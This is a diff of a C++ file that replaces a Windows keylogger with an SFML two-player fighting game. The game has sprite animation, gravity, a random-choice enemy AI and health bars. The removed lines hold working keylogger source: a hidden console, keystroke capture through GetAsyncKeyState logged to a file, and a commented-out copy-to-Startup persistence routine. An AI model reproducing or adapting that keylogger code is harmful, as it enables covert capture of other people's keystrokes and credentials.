@@ -1,75 +1,500 @@
-#include <iostream>
+#include <SFML/Graphics.hpp>
 #include <fstream>
-#include <windows.h>
-#include <winuser.h>
-#include <shlobj.h>
-#include <filesystem>
+#include <sstream>
+#include <unordered_map>
+using namespace sf;
 
-using namespace std;
+struct State_Cords {
+    String state;
+    IntRect Cords;
+    int Count = 0;
+};
 
-void hideConsole() {
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_HIDE);
+struct Character {
+    int health;
+    float weight = 1.8;
+    float gravity = 1.8;
+    bool onGround = false;
+    float speed = 4;
+    Vector2f Position;
+
+    Keyboard::Key Left;
+    Keyboard::Key Right;
+
+    Image img;
+    Texture sheet;
+    Sprite sprite;
+    IntRect Crop;
+    Clock animClock;
+    float frameDelay = 0.08f;
+    int ani_state = 0;
+    bool ani_rev;
+    State_Cords Current;
+
+    std::unordered_map<std::string, State_Cords> State;
+
+    void flip(int n) {
+        Position = sprite.getPosition();
+        sprite.setScale(Vector2f(n, 1.f));
+        sprite.setPosition(Position + Vector2f(Current.Cords.size.x * n, 0));
+    }
+
+    bool isAttacking() {
+        return Current.state == "Punch" || Current.state == "Kick" || Current.state == "LowSweep"
+            || Current.state == "UpperCut" || Current.state == "Bicycle";
+    }
+
+    void setState(State_Cords& state) {
+        Position = sprite.getPosition();
+        Current = state;
+        ani_state = 0;
+        Crop = Current.Cords;
+        sprite.setOrigin(Vector2f(Current.Cords.size));
+        sprite.setPosition(Position);
+    }
+
+    void update() {
+        if (ani_state >= Current.Count - 1 || Current.state == "Idle") {
+            if (Keyboard::isKeyPressed(Keyboard::Key::S)) {
+                if (Keyboard::isKeyPressed(Keyboard::Key::K) && Current.state != "LowSweep")
+                    setState(State["LowSweep"]);
+            }
+            else if (Keyboard::isKeyPressed(Keyboard::Key::W)) {
+                if (Keyboard::isKeyPressed(Keyboard::Key::J) && Current.state != "Uppercut")
+                    setState(State["Uppercut"]);
+                else if (Keyboard::isKeyPressed(Keyboard::Key::K) && Current.state != "Bicycle")
+                    setState(State["Bicycle"]);
+            }
+            else if (Keyboard::isKeyPressed(Keyboard::Key::Space) && Current.state != "Jump") {
+                setState(State["Jump"]);
+                gravity = -25;
+                onGround = false;
+            }
+
+            else if (Keyboard::isKeyPressed(Keyboard::Key::J) && Current.state != "Punch")
+                setState(State["Punch"]);
+
+            else if (Keyboard::isKeyPressed(Keyboard::Key::K) && Current.state != "Kick")
+                setState(State["Kick"]);
+
+            else if (Keyboard::isKeyPressed(Keyboard::Key::L) && Current.state != "Block")
+                setState(State["Block"]);
+
+            else if (Keyboard::isKeyPressed(Left) && Current.state != "MovL")
+                setState(State["MovL"]);
+
+            else if (Keyboard::isKeyPressed(Right) && Current.state != "MovR")
+                setState(State["MovR"]);
+        }
+
+        animate();
+    }
+
+    void animate() {
+        float elapsed = animClock.getElapsedTime().asSeconds();
+        if (elapsed >= frameDelay) {
+            if (Current.state == "Idle" || (Current.state == "Ready" && ani_rev)) {
+                if (ani_rev) ani_state--;
+                else         ani_state++;
+
+                if (ani_state >= Current.Count - 1) ani_rev = true;
+                else if (ani_state <= 0) {
+                    ani_rev = false;
+                    if (Current.state == "Ready") {
+                        setState(State["Idle"]);
+                    }
+                }
+            }
+            else {
+                if (ani_state < Current.Count - 1) {
+                    ani_state++;
+                }
+                else {
+                    if ((Current.state == "MovR" && Keyboard::isKeyPressed(Right)) ||
+                        (Current.state == "MovL" && Keyboard::isKeyPressed(Left)) ||
+                        (Current.state == "Block" && Keyboard::isKeyPressed(Keyboard::Key::L))) {
+                    }
+                    else if (Current.state == "Start") {
+                        setState(State["Ready"]);
+                        ani_state = Current.Count - 1;
+                        ani_rev = true;
+                    }
+                    else {
+                        setState(State["Idle"]);
+                        ani_rev = false;
+                    }
+                }
+            }
+
+            Crop = Current.Cords;
+            Crop.position.x += ani_state * (Current.Cords.size.x + 2);
+            sprite.setTextureRect(Crop);
+            animClock.restart();
+        }
+    }
+
+    void Move() {
+        if (Current.state == "MovL") {
+            sprite.setPosition(sprite.getPosition() + (Vector2f(-1, 0)) * speed);
+        }
+        else if (Current.state == "MovR") {
+            sprite.setPosition(sprite.getPosition() + (Vector2f(1, 0)) * speed);
+        }
+        else if (Current.state == "Jump") {
+            if (Keyboard::isKeyPressed(Left))
+                sprite.setPosition(sprite.getPosition() + (Vector2f(-1.5, 0)) * speed);
+            else if (Keyboard::isKeyPressed(Right))
+                sprite.setPosition(sprite.getPosition() + (Vector2f(1.5, 0)) * speed);
+        }
+    }
+
+    void loadStates(std::string str) {
+        bool inSection = false;
+        std::string line;
+        int x, y, w, h, c;
+        std::string state_name;
+        std::fstream data;
+        data.open("Assets_1/Character.data", std::ios::in);
+        while (std::getline(data, line)) {
+            if (line == "[" + str + "]") {
+                inSection = true;
+                continue;
+            }
+            if (inSection) {
+                if (line.empty() || line[0] == '[') break;
+                std::istringstream ss(line);
+                if (ss >> state_name >> x >> y >> w >> h >> c)
+                    State[state_name] = { state_name, IntRect({x,y},{w,h}),c };
+            }
+        }
+
+    }
+
+    Character(std::string str) :health(100), ani_rev(false), Position(100, 100), img("Assets_1/" + str + ".png"), sprite(sheet),
+        Left(Keyboard::Key::A), Right(Keyboard::Key::D) {
+        loadStates(str);
+
+        Current = State["Start"];
+        Crop = Current.Cords;
+
+        img.createMaskFromColor(Color(0, 255, 80));
+        sheet.loadFromImage(img);
+        sprite.setTexture(sheet);
+        sprite.setTextureRect(Crop);
+
+        sprite.setOrigin(Vector2f(0, Current.Cords.size.y));
+        sprite.setPosition(Position);
+    }
+};
+
+void SimulateGravity(Character& c1, int ground = 550) {
+    if (!c1.onGround || c1.sprite.getPosition().y < ground) {
+        c1.sprite.setPosition(c1.sprite.getPosition() + Vector2f(0, c1.gravity));
+        c1.gravity += c1.weight;
+        c1.onGround = false;
+
+        if (c1.sprite.getPosition().y >= ground) {
+            c1.sprite.setPosition(Vector2f(c1.sprite.getPosition().x, ground));
+            c1.gravity = 0;
+            c1.onGround = true;
+        }
+    }
+
+    else {
+        c1.gravity = 0;
+        c1.onGround = true;
+    }
 }
 
-//void copyToStartup() {
-//    char exePath[MAX_PATH];
-//    GetModuleFileNameA(NULL, exePath, MAX_PATH);
-//
-//    char startupPath[MAX_PATH];
-//    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
-//        std::filesystem::path dest = std::string(startupPath) + "\\" + std::filesystem::path(exePath).filename().string();
-//
-//        if (!std::filesystem::exists(dest)) {
-//            CopyFileA(exePath, dest.string().c_str(), FALSE);
-//        }
-//    }
-//}
-
-void logKey(int key, ofstream& logFile) {
-    switch (key) {
-    case VK_RETURN: logFile << "[Enter]"; break;
-    case VK_TAB: logFile << "[Tab]"; break;
-    case VK_BACK: logFile << "[Backspace]"; break;
-    case VK_SPACE: logFile << ' '; break;
-    case VK_SHIFT: logFile << "[Shift]"; break;
-    case VK_CONTROL: logFile << "[Ctrl]"; break;
-    case VK_MENU: logFile << "[Alt]"; break;
-    case VK_ESCAPE: logFile << "[Esc]"; break;
-    case VK_LEFT: logFile << "[Left]"; break;
-    case VK_RIGHT: logFile << "[Right]"; break;
-    case VK_UP: logFile << "[Up]"; break;
-    case VK_DOWN: logFile << "[Down]"; break;
-    case VK_DELETE: logFile << "[Delete]"; break;
-    case VK_HOME: logFile << "[Home]"; break;
-    case VK_END: logFile << "[End]"; break;
-    case VK_PRIOR: logFile << "[PageUp]"; break;
-    case VK_NEXT: logFile << "[PageDown]"; break;
-    case VK_INSERT: logFile << "[Insert]"; break;
-    default:
-        if (key >= 32 && key <= 126)
-            logFile << static_cast<char>(key);
-        break;
+void updateEnemy(Character& player, Character& enemy) {
+    static int delay = 0;
+    delay++;
+    if (delay > 30) {
+        delay = 0;
+        int distance = player.sprite.getPosition().x - enemy.sprite.getPosition().x;
+        int decision = rand() % 100;
+        if (enemy.ani_state >= enemy.Current.Count - 1 || enemy.Current.state == "Idle") {
+            if (std::abs(distance) > 200) {
+                if (distance < 0)
+                    enemy.setState(enemy.State["MovL"]);
+                else if (distance > 0)
+                    enemy.setState(enemy.State["MovR"]);
+            }
+            else {
+                if (decision < 10)
+                    enemy.setState(enemy.State["Punch"]);
+                else if (decision < 20)
+                    enemy.setState(enemy.State["Kick"]);
+                else if (decision < 30)
+                    enemy.setState(enemy.State["LowSweep"]);
+                else if (decision < 40)
+                    enemy.setState(enemy.State["Uppercut"]);
+                else if (decision < 50)
+                    enemy.setState(enemy.State["Bicycle"]);
+                else if (decision < 60)
+                    enemy.setState(enemy.State["Block"]);
+                else if (decision < 65) {
+                    if (enemy.Current.state != "Jump") {
+                        enemy.setState(enemy.State["Jump"]);
+                        enemy.gravity = -25;
+                        enemy.onGround = false;
+                        if (distance < 0)
+                            enemy.sprite.setPosition(enemy.sprite.getPosition() + Vector2f(2, 0) * enemy.speed);
+                        else
+                            enemy.sprite.setPosition(enemy.sprite.getPosition() + Vector2f(-2, 0) * enemy.speed);
+                    }
+                }
+                else if (decision < 70) {
+                    if (distance < 0)
+                        enemy.setState(enemy.State["MovR"]);
+                    else
+                        enemy.setState(enemy.State["MovL"]);
+                }
+                else if (enemy.Current.state != "Idle") {
+                    enemy.setState(enemy.State["Idle"]);
+                }
+            }
+        }
     }
-    logFile.flush();  // Ensure it writes immediately
+    enemy.animate();
+}
+
+void animateLose(Character& Player, Character& Enemy, RenderWindow& window, Sprite& bg) {
+
+    Enemy.setState(Enemy.State["Win"]);
+
+    Clock winClock;
+    int winFrames = 0;
+
+    Image ko_img;
+    ko_img.loadFromFile("Assets_1/KO.jpg");
+    ko_img.createMaskFromColor(Color(255, 255, 255));
+    Texture ko_tex;
+    ko_tex.loadFromImage(ko_img);
+    Sprite KO(ko_tex);
+    KO.setPosition(Vector2f(212, 167));
+
+    while (winFrames < Enemy.Current.Count && window.isOpen()) {
+
+        Enemy.animate();
+
+        window.clear();
+        window.draw(bg);
+        window.draw(Enemy.sprite);
+        window.draw(Player.sprite);
+        window.draw(KO);
+        window.display();
+
+        if (winClock.getElapsedTime().asSeconds() >= Enemy.frameDelay) {
+            winFrames++;
+            winClock.restart();
+        }
+    }
+    sleep(seconds(1.5));
+}
+
+void animateWin(Character& Player, Character& Enemy, RenderWindow& window, Sprite& bg) {
+    Player.setState(Player.State["Win"]);
+
+    Clock winClock;
+    int winFrames = 0;
+
+    Image ko_img;
+    ko_img.loadFromFile("Assets_1/KO.jpg");
+    ko_img.createMaskFromColor(Color(255, 255, 255));
+    Texture ko_tex;
+    ko_tex.loadFromImage(ko_img);
+    Sprite KO(ko_tex);
+    KO.setPosition(Vector2f(212, 167));
+
+    while (winFrames < Player.Current.Count && window.isOpen()) {
+
+        Player.animate();
+
+        window.clear();
+        window.draw(bg);
+        window.draw(Enemy.sprite);
+        window.draw(Player.sprite);
+        window.draw(KO);
+        window.display();
+
+        if (winClock.getElapsedTime().asSeconds() >= Player.frameDelay) {
+            winFrames++;
+            winClock.restart();
+        }
+    }
+    sleep(seconds(1.5));
+}
+
+bool collides(FloatRect R1, FloatRect R2) {
+    if (R1.position.x + R1.size.x > R2.position.x &&
+        R1.position.y + R1.size.y > R2.position.y &&
+        R2.position.x + R2.size.x > R1.position.x &&
+        R2.position.y + R2.size.y > R1.position.y)
+        return true;
+    else
+        return false;
+}
+
+void checkDirection(bool& isInverted, Character& Player, Character& Enemy) {
+    if (!isInverted && Player.sprite.getPosition().x > Enemy.sprite.getPosition().x) {
+        Player.flip(1);
+        Enemy.flip(-1);
+        isInverted = true;
+    }
+    else if (isInverted && Player.sprite.getPosition().x < Enemy.sprite.getPosition().x) {
+        Player.flip(-1);
+        Enemy.flip(1);
+        isInverted = false;
+    }
+}
+
+bool isEnterPressed() {
+    return sf::Keyboard::isKeyPressed(sf::Keyboard::Key::Enter);
+}
+
+void runStartScreen(sf::RenderWindow& window) {
+    sf::RectangleShape background(sf::Vector2f(window.getSize().x, window.getSize().y));
+    background.setFillColor(sf::Color::Black);
+    window.draw(background);
+    window.display();
 }
 
 int main() {
-    hideConsole();       // Hide the console
-    //copyToStartup();     // Copy itself to startup folder
+    RenderWindow window(VideoMode({ 800,600 }), "CAFAEM", State::Windowed);
+    window.setVerticalSyncEnabled(true);
 
-    ofstream logFile("keylog.txt", ios::app);  // Open log file in append mode
-    if (!logFile.is_open()) return 1;
+    bool isMenu = true;
 
-    // Keylogger loop
-    while (true) {
-        for (int key = 0; key < 256; key++) {
-            if (GetAsyncKeyState(key) & 1) {
-                logKey(key, logFile);
-            }
+    while (isMenu) {
+        for (int i = 0; i < 4; i++) {
+            sf::Texture texture;
+            texture.loadFromFile("Assets_1/Bg/menu (" + std::to_string(i) + ").png");
+            sf::Sprite sprite(texture);
+
+            window.clear();
+            window.draw(sprite);
+            window.display();
+
+            sf::sleep(sf::milliseconds(100));
         }
-        Sleep(10);  // Slight delay to reduce CPU usage
+        if (sf::Keyboard::isKeyPressed(sf::Keyboard::Key::Enter)) {
+            isMenu = false;  // Exit the loop if Enter is pressed
+        }
     }
 
-    return 0;
+    RectangleShape H1;
+    H1.setFillColor(Color::Blue);
+    H1.setPosition(Vector2f(50, 50));
+    RectangleShape H2;
+    H2.setFillColor(Color::Blue);
+    H2.setPosition(Vector2f(750, 50));
+
+    Texture fg_tex;
+    fg_tex.loadFromFile("Assets_1/Fight.png");
+
+    Sprite fg_sp(fg_tex);
+    fg_sp.setTexture(fg_tex);
+    fg_sp.setScale(Vector2f(0.5, 0.5));
+    fg_sp.setPosition(Vector2f(144, 44));
+
+    Texture bg_tex;
+    bg_tex.loadFromFile("Assets_1/Bg/Round 1 (1).png");
+    Sprite bg(bg_tex);
+
+    int round = 1, roundWin = 0, roundLose = 0, bg_ani, fr_delay;
+    int dmg_cld = 0;
+    bool isInverted = false;
+
+Game_Start:
+    bool roundStart = true;
+    bg_ani = 1;
+    fr_delay = 0;
+
+    Character Player("Goku");
+    Player.sprite.setPosition(Vector2f(200, 550));
+    Player.flip(-1);
+
+    Character Enemy("Roku");
+    Enemy.sprite.setPosition(Vector2f(700, 550));
+
+    while (window.isOpen())
+    {
+        while (const std::optional event = window.pollEvent())
+        {
+            if (event->is<Event::Closed>())
+                window.close();
+        }
+
+        H1.setSize(Vector2f(Player.health * 3, 30));
+        H2.setSize(Vector2f(Enemy.health * 3, 30));
+        H2.setOrigin(Vector2f(Enemy.health * 3, 0));
+
+        bg_tex.loadFromFile("Assets_1/Bg/Round " + std::to_string(round) + " (" + std::to_string(bg_ani) + ").png");
+        bg.setTexture(bg_tex);
+        bg.setScale(Vector2f(1.25, 1.172));
+
+        checkDirection(isInverted, Player, Enemy);
+
+        Player.update();
+        Player.Move();
+        SimulateGravity(Player);
+
+        updateEnemy(Player, Enemy);
+        Enemy.Move();
+        SimulateGravity(Enemy);
+
+        if (collides(Player.sprite.getGlobalBounds(), Enemy.sprite.getGlobalBounds())) {
+            if (Player.isAttacking() && dmg_cld > 30) {
+                Enemy.setState(Enemy.State["Hurt"]);
+                Enemy.health -= 3;
+                dmg_cld = 0;
+            }
+            else if (Enemy.isAttacking() && dmg_cld > 30) {
+                Player.setState(Player.State["Hurt"]);
+                Player.health -= 3;
+                dmg_cld = 0;
+            }
+        }
+        dmg_cld++;
+
+        if (Enemy.health <= 0) {
+            roundWin++;
+            round++;
+            animateWin(Player, Enemy, window, bg);
+            if (roundWin >= 2)
+                break;
+            goto Game_Start;
+        }
+        else if (Player.health <= 0) {
+            roundLose++;
+            round++;
+            animateLose(Player, Enemy, window, bg);
+            if (roundLose >= 2)
+                break;
+            goto Game_Start;
+        }
+
+        if (++fr_delay >= 10) {
+            fr_delay = 0;
+            if (++bg_ani > 8) {
+                bg_ani = 1;
+            }
+        }
+
+        window.clear();
+        window.draw(bg);
+        window.draw(Enemy.sprite);
+        window.draw(Player.sprite);
+        window.draw(H1);
+        window.draw(H2);
+        if (roundStart) {
+            window.draw(fg_sp);
+            window.display();
+            sleep(seconds(1));
+            roundStart = false;
+        }
+        else
+            window.display();
+    }
 }
